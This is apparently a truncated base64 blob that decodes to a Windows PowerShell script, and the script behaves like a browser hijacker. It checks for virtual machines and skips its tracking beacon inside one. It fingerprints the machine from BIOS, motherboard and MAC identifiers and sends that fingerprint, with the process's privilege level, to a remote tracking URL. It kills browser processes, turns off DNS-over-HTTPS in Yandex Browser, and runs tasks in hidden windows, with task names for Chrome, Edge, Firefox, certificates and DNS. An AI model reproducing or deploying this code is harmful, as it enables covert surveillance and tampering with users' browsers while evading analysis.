XN0ZW0gPSBHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9Db21wdXRlclN5c3RlbQ0KICAgICRpc1ZpcnR1YWwgPSAkZmFsc2UNCg0KICAgICMgQ2hlY2sgZm9yIGNvbW1vbiB2aXJ0dWFsaXphdGlvbiBtYW51ZmFjdHVyZXJzDQogICAgJHZtTWFudWZhY3R1cmVycyA9IEAoDQogICAgICAgICJNaWNyb3NvZnQgQ29ycG9yYXRpb24iLCAgICMgSHlwZXItVg0KICAgICAgICAiVk13YXJlLCBJbmMuIiwgICAgICAgICAgICAjIFZNd2FyZQ0KICAgICAgICAiWGVuIiwgICAgICAgICAgICAgICAgICAgICAjIFhlbg0KICAgICAgICAiWGVuU291cmNlLCBJbmMuIiwgICAgICAgICAjIFhlblNvdXJjZQ0KICAgICAgICAiaW5ub3RlayBHbWJIIiwgICAgICAgICAgICAjIFZpcnR1YWxCb3gNCiAgICAgICAgIk9yYWNsZSBDb3Jwb3JhdGlvbiIsICAgICAgIyBWaXJ0dWFsQm94DQogICAgICAgICJQYXJhbGxlbHMgU29mdHdhcmUgSW50ZXJuYXRpb25hbCBJbmMuIiwgIyBQYXJhbGxlbHMNCiAgICAgICAgIlFFTVUiLCAgICAgICAgICAgICAgICAgICAgIyBRRU1VDQogICAgICAgICJSZWQgSGF0LCBJbmMuIiwgICAgICAgICAgICMgS1ZNDQogICAgICAgICJBbWF6b24gRUMyIiwgICAgICAgICAgICAgICMgQVdTIEVDMg0KICAgICAgICAiR29vZ2xlIiwgICAgICAgICAgICAgICAgICAjIEdvb2dsZSBDbG91ZCBQbGF0Zm9ybQ0KICAgICAgICAiVmlydHVvenpvIiwgICAgICAgICAgICAgICAjIFZpcnR1b3p6bw0KICAgICAgICAiRGlnaXRhbE9jZWFuIiAgICAgICAgICAgICAjIERpZ2l0YWxPY2Vhbg0KICAgICkNCg0KICAgICMgQ2hlY2sgTWFudWZhY3R1cmVyIGFuZCBNb2RlbCBmb3Igc2lnbnMgb2YgdmlydHVhbGl6YXRpb24NCiAgICBpZiAoJHZtTWFudWZhY3R1cmVycyAtY29udGFpbnMgJGNvbXB1dGVyU3lzdGVtLk1hbnVmYWN0dXJlcikgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9IGVsc2VpZiAoJGNvbXB1dGVyU3lzdGVtLk1vZGVsIC1tYXRjaCAiVmlydHVhbHxWTXxWQk9YfEtWTXxRRU1VfFBhcmFsbGVsc3xYZW4iKSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0NCg0KICAgICMgQWRkaXRpb25hbCBjaGVja3MgZm9yIHZpcnR1YWxpemF0aW9uIHVzaW5nIFdpbjMyX0JJT1MNCiAgICAkYmlvcyA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0JJT1MNCiAgICBpZiAoJGJpb3MuU2VyaWFsTnVtYmVyIC1tYXRjaCAiVk13YXJlfFZCT1h8VmlydHVhbHxYZW58UUVNVXxQYXJhbGxlbHMiKSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0NCg0KICAgICMgQWRkaXRpb25hbCBjaGVja3MgdXNpbmcgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWN0DQogICAgJGNvbXB1dGVyU3lzdGVtUHJvZHVjdCA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtUHJvZHVjdA0KICAgIGlmICgkY29tcHV0ZXJTeXN0ZW1Qcm9kdWN0LlZlcnNpb24gLW1hdGNoICJWaXJ0dWFsfFZNfFZCT1h8S1ZNfFFFTVV8UGFyYWxsZWxzfFhlbiIpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfQ0KDQogICAgIyBBZGRpdGlvbmFsIHJlZ2lzdHJ5IGNoZWNrIGZvciBQYXJhbGxlbHMNCiAgICAkcGFyYWxsZWxzS2V5ID0gIkhLTE06XFNPRlRXQVJFXFBhcmFsbGVsc1xQYXJhbGxlbHMgVG9vbHMiDQogICAgaWYgKFRlc3QtUGF0aCAkcGFyYWxsZWxzS2V5KSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0NCg0KICAgIHJldHVybiAkaXNWaXJ0dWFsDQp9DQoNCg0KZnVuY3Rpb24gR2V0LU1hY2hpbmVIYXNoQ29kZSB7DQogICAgIyBHZXQgQklPUyBTZXJpYWwgTnVtYmVyDQogICAgJGJpb3NTZXJpYWwgPSAoR2V0LVdtaU9iamVjdCBXaW4zMl9CSU9TKS5TZXJpYWxOdW1iZXINCg0KICAgICMgR2V0IE1vdGhlcmJvYXJkIFNlcmlhbCBOdW1iZXINCiAgICAkbWJTZXJpYWwgPSAoR2V0LVdtaU9iamVjdCBXaW4zMl9CYXNlQm9hcmQpLlNlcmlhbE51bWJlcg0KDQogICAgIyBHZXQgTUFDIEFkZHJlc3Mgb2YgdGhlIGZpcnN0IG5ldHdvcmsgYWRhcHRlcg0KICAgICRtYWNBZGRyZXNzID0gKEdldC1XbWlPYmplY3QgV2luMzJfTmV0d29ya0FkYXB0ZXJDb25maWd1cmF0aW9uIHwgV2hlcmUtT2JqZWN0IHsgJF8uTUFDQWRkcmVzcyAtYW5kICRfLklQRW5hYmxlZCB9KS5NQUNBZGRyZXNzWzBdDQoNCiAgICAjIENvbWJpbmUgdGhlIGhhcmR3YXJlIGlkZW50aWZpZXJzIGludG8gYSBzaW5nbGUgc3RyaW5nDQogICAgJGNvbWJpbmVkU3RyaW5nID0gIiRiaW9zU2VyaWFsJG1iU2VyaWFsJG1hY0FkZHJlc3MiDQoNCiAgICAjIENvbXB1dGUgdGhlIGhhc2ggY29kZSB1c2luZyBTSEEyNTYNCiAgICAkc2hhMjU2ID0gW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuU0hBMjU2XTo6Q3JlYXRlKCkNCiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRjb21iaW5lZFN0cmluZykNCiAgICAkaGFzaEJ5dGVzID0gJHNoYTI1Ni5Db21wdXRlSGFzaCgkYnl0ZXMpDQogICAgJGhhc2hTdHJpbmcgPSBbQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJGhhc2hCeXRlcykgLXJlcGxhY2UgIi0iLCAiIg0KDQogICAgcmV0dXJuICRoYXNoU3RyaW5nDQp9DQoNCg0KZnVuY3Rpb24gR2VuZXJhdGUtSGFzaCB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRkYXRhLA0KICAgICAgICBbc3RyaW5nXSRrZXkNCiAgICApDQoNCiAgICAka2V5Qnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRrZXkpDQogICAgJGRhdGFCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGRhdGEpDQogICAgDQogICAgJGhtYWMgPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuSE1BQ1NIQTI1Ng0KICAgICRobWFjLktleSA9ICRrZXlCeXRlcw0KICAgICRoYXNoQnl0ZXMgPSAkaG1hYy5Db21wdXRlSGFzaCgkZGF0YUJ5dGVzKQ0KICAgIA0KICAgIHJldHVybiBbQ29udmVydF06OlRvQmFzZTY0U3RyaW5nKCRoYXNoQnl0ZXMpDQp9DQoNCmZ1bmN0aW9uIFdyaXRlLVN0cmluZ1RvRmlsZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRGaWxlTmFtZSwNCiAgICAgICAgW3N0cmluZ10kQ29udGVudA0KICAgICkNCiAgICANCiAgICAjIEdldCB0aGUgcGF0aCB0byB0aGUgZGVza3RvcA0KICAgICREZXNrdG9wUGF0aCA9IFtTeXN0ZW0uRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdEZXNrdG9wJykNCiAgICANCiAgICAjIENyZWF0ZSB0aGUgZnVsbCBwYXRoIHRvIHRoZSBmaWxlDQogICAgJEZpbGVQYXRoID0gSm9pbi1QYXRoIC1QYXRoICREZXNrdG9wUGF0aCAtQ2hpbGRQYXRoICRGaWxlTmFtZQ0KICAgIA0KICAgICMgV3JpdGUgdGhlIGNvbnRlbnQgdG8gdGhlIGZpbGUsIGNyZWF0aW5nIG9yIG92ZXJ3cml0aW5nIGl0DQogICAgU2V0LUNvbnRlbnQgLVBhdGggJEZpbGVQYXRoIC1WYWx1ZSAkQ29udGVudA0KfQ0KDQpmdW5jdGlvbiBHZXRTZXJpZSgpDQp7DQogICAgcmV0dXJuIFJlZ1JlYWRQYXJhbSAta2V5TmFtZSAidHJhY2tTZXJpZSINCn0NCg0KDQpmdW5jdGlvbiBkb190cmFja2VyIHsNCiAgICBpZiAoJHNlcnZlci50cmFjayAtZXEgJGZhbHNlKXsNCiAgICAgICAgcmV0dXJuDQogICAgfQ0KDQogICAgJGlzVk0gPSBJcy1WaXJ0dWFsTWFjaGluZQ0KICAgIGlmICgkaXNWTSAtZXEgJHRydWUpew0KICAgICAgICByZXR1cm4NCiAgICB9DQoNCiAgICAkZWxldmF0ZWQgPSAwDQogICAgaWYgKElzRWxldmF0ZWQpDQogICAgew0KICAgICAgICAkZWxldmF0ZWQ9MTsNCiAgICB9DQoNCiAgICAkaWQgPSBHZXQtTWFjaGluZUhhc2hDb2RlDQoNCiAgICAkYm9keSA9ICJ7YCJpZGAiOmAiJCgkaWQuVG9TdHJpbmcoKSlgIixgInNlcmllYCI6YCIkKEdldFNlcmllKWAiLGAiZWxldmF0ZWRfbnVtYmVyYCI6JCgkZWxldmF0ZWQpfSINCg0KDQogICAgIyBTZWNyZXQga2V5IChzaGFyZWQgd2l0aCB0aGUgc2VydmVyKQ0KICAgICRzZWNyZXRLZXkgPSAiWW91clNlY3JldEtleUhlcmUiDQoNCiAgICAkdXJsPSAkc2VydmVyLnRyYWNrVXJsDQogIA0KICAgICMgR2VuZXJhdGUgdGhlIGhhc2ggZm9yIHRoZSBKU09OIHJlcXVlc3QgYm9keQ0KICAgICRoYXNoID0gR2VuZXJhdGUtSGFzaCAtZGF0YSAkYm9keSAta2V5ICRzZWNyZXRLZXkNCg0KICAgICMgUHJlcGFyZSBoZWFkZXJzDQogICAgJGhlYWRlcnMgPSBAew0KICAgICAgICAiWC1TaWduYXR1cmUiID0gJGhhc2gNCiAgICAgICAgIkNvbnRlbnQtVHlwZSIgPSAiYXBwbGljYXRpb24vanNvbiINCiAgICAgICAgIlVzZXItQWdlbnQiICA9ICJQb3dlclNoZWxsLzcuMiIgICMgVXNlIHRoZSBVc2VyLUFnZW50IGZyb20gUG9zdG1hbiBpZiBrbm93bg0KICAgIH0NCg0KICAgICR0aW1lb3V0ID0gW2RhdGV0aW1lXTo6VXRjTm93LkFkZE1pbnV0ZXMoMSkNCiAgICAkZGVsYXkgPSA1DQoNCiAgICANCiAgICB3aGlsZSAoW2RhdGV0aW1lXTo6VXRjTm93IC1sdCAkdGltZW91dCkgDQogICAgew0KICAgICANCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBJbnZva2UtV2ViUmVxdWVzdCAtSGVhZGVycyAkaGVhZGVycyAtTWV0aG9kICJQT1NUIiAtQm9keSAkYm9keSAtVXJpICR1cmwgLUNvbnRlbnRUeXBlICJhcHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04Ig0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgY2F0Y2ggW1N5c3RlbS5OZXQuV2ViRXhjZXB0aW9uXSB7DQogICAgICAgICAgICAgICAgJHN0YXR1c0NvZGUgPSAkXy5FeGNlcHRpb24uUmVzcG9uc2UuU3RhdHVzQ29kZQ0KICAgICAgICAgICAgICAgICRyZXNwU3RyZWFtID0gJF8uRXhjZXB0aW9uLlJlc3BvbnNlLkdldFJlc3BvbnNlU3RyZWFtKCkNCiAgICAgICAgICAgICAgICAkcmVhZGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKCRyZXNwU3RyZWFtKQ0KICAgICAgICAgICAgICAgICRyZWFkZXIuQmFzZVN0cmVhbS5Qb3NpdGlvbiA9IDANCiAgICAgICAgICAgICAgICAkcmVzcG9uc2VCb2R5ID0gJHJlYWRlci5SZWFkVG9FbmQoKSB8IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG1ha2luZyByZXF1ZXN0OiAkcmVzcG9uc2VCb2R5Ig0KICAgICAgICAgICAgDQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaHsNCiAgICAgICAgICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG1ha2luZyByZXF1ZXN0OiAkXyINCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJGRlbGF5DQogICAgfQ0KDQogICAgaWYgKCRzZXJ2ZXIudHJhY2tEZXNrdG9wIC1lcSAkdHJ1ZSl7DQogICAgICAgIFdyaXRlLVN0cmluZ1RvRmlsZSAtRmlsZU5hbWUgIiQoJHNlcnZlci50cmFja1NlcmllKS50eHQiIC1Db250ZW50ICRpZA0KICAgIH0NCg0KfQ0KDQpmdW5jdGlvbiBkb195YW5kZXgNCnsNCiAgICBDbG9zZS1Qcm9jZXNzZXMoQCgnc2VydmljZV91cGRhdGUuZXhlJywnYnJvd3Nlci5leGUnKSkNCg0KICAgIGZvcmVhY2ggKCRkaXIgaW4gR2V0LUVudlBhdGhzKSB7DQogICAgICAgICRwYXRoID0gSm9pbi1QYXRoIC1QYXRoICRkaXIgLUNoaWxkUGF0aCAnWWFuZGV4XFlhbmRleEJyb3dzZXJcVXNlciBEYXRhXExvY2FsIFN0YXRlJw0KDQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRwYXRoIC1QYXRoVHlwZSBMZWFmKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIENvbmZpZ3VyZVlhbmRleEludGVybmFsIC1GaWxlUGF0aCAkcGF0aA0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJFcnJvciBvY2N1cnJlZDogJF8iDQogICAgICAgIH0NCiAgICB9DQp9DQoNCmZ1bmN0aW9uIENvbmZpZ3VyZVlhbmRleEludGVybmFsIHsNCiAgICBwYXJhbSgNCiAgICAgICAgW3N0cmluZ10kZmlsZVBhdGgNCiAgICApDQogICAgJGNvbnRlbnQgPSBHZXQtQ29udGVudCAtUGF0aCAkZmlsZVBhdGggLVJhdyB8IENvbnZlcnRGcm9tLUpzb24NCg0KICAgIGlmICgkbnVsbCAtZXEgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLW9yICRjb250ZW50LmRuc19vdmVyX2h0dHBzIC1pc25vdCBbb2JqZWN0XSkgew0KICAgICAgICAkY29udGVudCB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdkbnNfb3Zlcl9odHRwcycgLVZhbHVlIEB7DQogICAgICAgICAgICAnbW9kZScgPSAnb2ZmJw0KICAgICAgICAgICAgJ3RlbXBsYXRlcycgPSAiIg0KICAgICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMubW9kZSA9ICdvZmYnDQogICAgICAgICRjb250ZW50LmRuc19vdmVyX2h0dHBzLnRlbXBsYXRlcyA9ICIiDQogICAgfQ0KDQogICAgJGpzb25TdHJpbmcgPSAkY29udGVudCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMA0KDQogICAgU2V0LUNvbnRlbnQgLVBhdGggJGZpbGVQYXRoIC1WYWx1ZSAkanNvblN0cmluZyAtRW5jb2RpbmcgVVRGOCAtRm9yY2UNCg0KICAgIHdyaXRlZGJnICJTdWNjZXNzZnVsbHkgY29uZmlndXJlZCBZYW5kZXggc2V0dGluZ3MgaW4gJGZpbGVQYXRoIg0KfQ0KDQojIyNoZWFkDQoNCg0KDQpmdW5jdGlvbiBJbnZva2UtU2NyaXB0DQp7DQogICAgcGFyYW0NCiAgICAoDQogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQ0KICAgICAgICBbc3RyaW5nXQ0KICAgICAgICAkc2NyaXB0UGF0aCwNCg0KICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0NCiAgICAgICAgW3N0cmluZ1tdXQ0KICAgICAgICAkdGFza05hbWUNCiAgICApDQogICAgaWYgKCRnbG9iYWxEZWJ1ZykNCiAgICB7DQogICAgICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIE5vcm1hbCAtQXJndW1lbnRMaXN0ICItZmlsZSAiIiRzY3JpcHRQYXRoIiIgLVRhc2sgJHRhc2tOYW1lIg0KICAgIH0NCiAgICBlbHNlDQogICAgew0KICAgICAgICBTdGFydC1Qcm9jZXNzIHBvd2Vyc2hlbGwuZXhlIC1XaW5kb3dTdHlsZSBIaWRkZW4gLUFyZ3VtZW50TGlzdCAiLWZpbGUgIiIkc2NyaXB0UGF0aCIiIC1UYXNrICR0YXNrTmFtZSINCiAgICB9DQp9DQoNCiRnbG9iYWw6VGFzayA9ICRudWxsDQoNCmZvciAoJGkgPSAwOyAkaSAtbHQgJGFyZ3MuQ291bnQ7ICRpKyspIHsNCiAgICBpZiAoJGFyZ3NbJGldIC1lcSAnLVRhc2snKSB7DQogICAgICAgIGlmICgkaSArIDEgLWx0ICRhcmdzLkNvdW50KSB7DQogICAgICAgICAgICAkZ2xvYmFsOlRhc2sgPSAkYXJnc1skaSArIDFdDQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICB3cml0ZWRiZyAiTm8gdmFsdWUgcHJvdmlkZWQgZm9yIC1UYXNrIGFyZ3VtZW50LiINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gTWFpbiANCnsNCiAgICAkc2NyaXB0UGF0aCA9IEdldC1TY3JpcHRQYXRoDQogICAgd3JpdGVkYmcgInByb2dyYW0gY3VyU2NyaXB0OiAkc2NyaXB0UGF0aCINCg0KICAgIGlmICgkZ2xvYmFsOlRhc2spIHsNCiAgICAgICAgd3JpdGVkYmcgIlRhc2sgLSAkdGFzayINCiAgICAgICAgJiAkZ2xvYmFsOlRhc2sNCiAgICB9IGVsc2UgeyAgICAgICAgICAgICAgIA0KDQogICAgICAgICR0YXNrRnVuY3Rpb25zID0gQCgNCiAgICAgICAgICAgICdkb19kbnNtYW4nLCdkb19jZXJ0JywnZG9fY2hyb21lJywnZG9fY2hyb21lX3B1c2gnLCdkb19jaHJvbWVfdWJsb2NrJywnZG9fZWRnZScsJ2RvX2VtYmVkZGluZ3MnLCdkb19maXJlZm94JywnZG9fb3BlcmEnLCdkb19zdGFydGRvd25sb2FkcycsJ2RvX3N0YXJ0dXJscycsJ2RvX3RyYWNrZXInLCdkb195YW5kZXgnLCdkb19leHRyYXVwZGF0ZScNCiAgICAgICAgKQ0KDQogICAgICAgIHdyaXRlZGJnICJNYWluIC0gIg0KICAgICAgICBmb3JlYWNoICgkdGFzayBpbiAkdGFza0Z1bmN0aW9ucykgDQogICAgICAgIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJNYWluIC0gJHRhc2siDQogICAgICAgICAgICBJbnZva2UtU2NyaXB0ICRzY3JpcHRQYXRoICR0YXNrDQogICAgICAgIH0NCiAgICB9DQp9DQoNCk1haW4="
